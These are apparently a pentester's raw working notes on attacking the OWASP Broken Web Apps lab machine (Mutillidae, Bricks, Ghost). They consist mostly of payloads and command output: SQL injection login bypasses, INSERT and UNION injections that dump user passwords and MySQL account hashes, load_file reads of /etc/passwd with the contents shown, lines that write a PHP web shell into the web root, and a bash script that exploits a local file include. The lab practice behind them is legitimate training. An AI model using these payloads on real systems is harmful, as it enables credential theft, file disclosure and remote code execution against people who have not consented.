https://pentester.land/challenge/2018/07/10/owasp-broken-web-apps-owasp-bricks-challenge-walkthrough.html
https://www.sans.org/blog/getting-moar-value-out-of-php-local-file-include-vulnerabilities/
https://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/index.html
https://kowalcj0.github.io/2018/01/23/mutillidae-ii-part-1/
https://portswigger.net/support/sql-injection-in-different-statement-types
https://portswigger.net/web-security/sql-injection/cheat-sheet
http://amolnaik4.blogspot.com/2012/02/sql-injection-in-insert-query.html
http://www.unixwiz.net/techtips/sql-injection.html


Version : 2.6.24
mysql :  mysql -u mutillidae -pmutillidae nowasp



' or 0=0 --,
" or 0=0 --,
or 0=0 --,
' or 0=0 #,
" or 0=0 #,
or 0=0 #,
' or 'x'='x,
" or "x"="x,
') or ('x'='x,
' or 1=1--,
" or 1=1--,
or 1=1--,
' or a=a--,
" or "a"="a,
') or ('a'='a,
") or ("a"="a,
hi" or "a"="a,
hi" or 1=1 --,
hi' or 1=1 --,
hi' or 'a'='a,
hi') or ('a'='a and hi") or ("a"="a


# Upload php command injection file
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'

# Load file
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6

# Bypass
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -

# PHP command injection from GET Request
<?php echo system($_GET["cmd"]);?>

# Alternative
<?php echo shell_exec($_GET["cmd"]);?>



└─$ sudo  nmap -sT -A -p- -Pn -n   192.168.53.131                                           1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 11:27 CEST
Nmap scan report for 192.168.53.131
Host is up (0.12s latency).
Not shown: 65526 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 5.3p1 Debian 3ubuntu4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 ea:83:1e:45:5a:a6:8c:43:1c:3c:e3:18:dd:fc:88:a5 (DSA)
|_  2048 3a:94:d8:3f:e0:a2:7a:b8:c3:94:d7:5e:00:55:0c:a7 (RSA)
80/tcp   open  http        Apache httpd 2.2.14 ((Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14 OpenSSL...)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14 OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1
|_http-title: owaspbwa OWASP Broken Web Applications
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Courier Imapd (released 2008)
|_imap-capabilities: OK THREAD=ORDEREDSUBJECT QUOTA completed CAPABILITY ACL2=UNIONA0001 ACL NAMESPACE IDLE CHILDREN THREAD=REFERENCES SORT UIDPLUS IMAP4rev1
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=owaspbwa
| Not valid before: 2013-01-02T21:12:38
|_Not valid after:  2022-12-31T21:12:38
|_ssl-date: 2021-05-03T09:27:43+00:00; -1s from scanner time.
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
5001/tcp open  java-object Java Object Serialization
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Site doesn't have a title.
8081/tcp open  http        Jetty 6.1.25
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(6.1.25)
|_http-title: Choose Your Path
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5001-TCP:V=7.91%I=7%D=5/3%Time=608FC200%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
MAC Address: 00:0C:29:8F:CA:00 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.17 - 2.6.36
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: OWASPBWA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT       ADDRESS
1   121.65 ms 192.168.53.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.62 seconds


SQL Query: SELECT * FROM users WHERE name='admin' and password='' or 1=1 # '


exploit_ghost.sh

#!/bin/bash

URL=http://192.168.53.131/ghost/iframe.php?page=
SHELL=wordpress/shell.php

printf "$ "
while read line
do
    if [[ "$line" == "exit" ]]; then
        break
    fi
   	P=php://filter/convert.base64-encode/resource=$line
    # curl -s -b cookie --data-urlencode "cmd=$line" $URL$line 
    curl -s -b cookie $URL$P| sed 's/<\/div><\/p>1/<\/div><\/p>1\n/' | sed 's/<center>/\n<center>/' | sed '1,16 d' | head -n -3 | base64 -d
    printf "$ "
done < "/proc/${$}/fd/0"



curl -G -s \
	-c cookie \
	-b cookie \
	-A "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"\
	--data-urlencode "page=user-info.php" \
	--data-urlencode "username=' or 2=2 -- -" \
	--data-urlencode "password=admin"\
	--data-urlencode "user-info-php-submit-button=View Account Details" \
    http://192.168.53.131/mutillidae/index.php \
| grep -i "username=" \
| sed -n '7p' \
| awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' \
| awk 'BEGIN{FS=">"}{print $2}' \
| sed '/^$/d' \
| sed ':a;N;$!ba;s/=\n/=/g' \
| sed 's/Username/\nUsername/'

' or 1=1 -- -



Hack'
INSERT INTO blogs_table(blogger_name, comment, date) VALUES ('user', 'Hack'', now() ) (0) [Exception] 
Hack' , now()) -- -
Hack' , now()), ('user', (select version()), now()) -- -
Hack' , now()), ('user', (select group_concat(username) from accounts), now()) -- -
Hack' , now()), ('user', (select group_concat(password) from accounts), now()) -- -





Hack' , now()), ('user', (select load_file(0x2f6574632f706173737764)), now()) -- -
Hack' , now()), ('user', (select group_concat(version(),user(),database())), now()) -- -
Hack' , now()), ('user', (select group_concat(schema_name) from information_schema.schemata), now()) -- -
Hack' , now()), ('user', (select group_concat(table_name) from information_schema.tables where table_schema=database()), now()) -- -
Hack' , now()), ('user', (select group_concat(column_name) from information_schema.columns
where table_schema='nowasp' and table_name='accounts'), now()) -- -
Hack' , now()), ('user', (select group_concat(User(),password) from mysql.user), now()) -- -
Hack' , now()), ('user', (select()), now()) -- -
Hack' , now()), ('user', (), now()) -- -

select version(),user(),database()
select @@hostname,@@datadir
select group_concat(schema_name) from information_schema.schemata => list databases

select group_concat(table_name) from information_schema.tables 
where table_schema=database() => tables of the current database

select group_concat(column_name) from information_schema.columns
where table_schema='bricks' and table_name='users'


select group_concat(name),group_concat(password) from users

select group_concat(host), group_concat(user),group_concat(Password) from mysql.user
select User(),password from mysql.user

select load_file(0x2f6574632f706173737764) from mysql.user 

echo -n "/etc/passwd" | od -t x1 -A n | sed 's/ *//g'
echo -n "/etc/passwd" | hexdump -v -e '/1 "%02x"'



http://192.168.53.131/mutillidae/index.php?page=register.php
INSERT INTO accounts (username, password, mysignature) VALUES (''', 'gmQFNB6Jihru8B5', 'signature')

test1',(select version()), (select database())) -- -
Username=test1
Password=5.1.41-3ubuntu12.6-log
Signature=nowasp

test2',(select version()), (select load_file(0x2f6574632f706173737764) from mysql.user limit 1)) -- -

Username=test2
Password=5.1.41-3ubuntu12.6-log
Signature=root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:102::/home/syslog:/bin/false klog:x:102:103::/home/klog:/bin/false mysql:x:103:105:MySQL Server,,,:/var/lib/mysql:/bin/false landscape:x:104:122::/var/lib/landscape:/bin/false sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin postgres:x:106:109:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash messagebus:x:107:114::/var/run/dbus:/bin/false tomcat6:x:108:115::/usr/share/tomcat6:/bin/false user:x:1000:1000:user,,,:/home/user:/bin/bash polkituser:x:109:118:PolicyKit,,,:/var/run/PolicyKit:/bin/false haldaemon:x:110:119:Hardware abstraction layer,,,:/var/run/hald:/bin/false pulse:x:111:120:PulseAudio daemon,,,:/var/run/pulse:/bin/false postfix:x:112:123::/var/spool/postfix:/bin/false





curl -G -s \
	-c cookie \
	-b cookie \
	-A "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"\
	--data-urlencode "page=user-info.php" \
	--data-urlencode "username=' or 2=2 -- -" \
	--data-urlencode "password=admin"\
	--data-urlencode "user-info-php-submit-button=View Account Details" \
    http://192.168.53.131/mutillidae/index.php \
| grep -i "username=" \
| sed -n '7p' \
| awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' \
| awk 'BEGIN{FS=">"}{print $2}' \
| sed '/^$/d' \
| sed ':a;N;$!ba;s/=\n/=/g' \
| sed 's/Username/\nUsername/'


curl -G -s \
	-c cookie \
	-b cookie \
	-A "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"\
	--data-urlencode "page=user-info.php" \
	--data-urlencode "username=' union select 1,2,3,4,5,6,7 -- -" \
	--data-urlencode "password=admin"\
	--data-urlencode "user-info-php-submit-button=View Account Details" \
    http://192.168.53.131/mutillidae/index.php \
| grep -i "username=" \
| sed -n '7p' \
| awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' \
| awk 'BEGIN{FS=">"}{print $2}' \
| sed '/^$/d' \
| sed ':a;N;$!ba;s/=\n/=/g' \
| sed 's/Username/\nUsername/'


' or 1=1 -- -

' or 1=1 union select 1,2,3,4,5,6,7 -- -
' or 1=1 order by 7 -- -
' or 1=2 union select 1,2,(0x2f6574632f706173737764),4,5,6,7 -- -
' or 1=2 union select 1,2,load_file(0x2f6574632f706173737764),4,5,6,7 -- -
' or 1=2 union select 1,2,load_file(0x2f6574632f706173737764),4,5,6,7 into outfile '/tmp/passwd.txt' -- -

' or 1=2 union select 1,2,"<?php system($_GET['cmd']) ?>",4,5,6,7 -- -

<!--?php echo ('Hi'); ?-->

$lPassword = $Encoder->encodeForHTML($row->password);





cat index.php
php -r "readfile('index.php');"

cat index.php | base64
php -r "readfile('php://filter/convert.base64-encode/resource=index.php');"


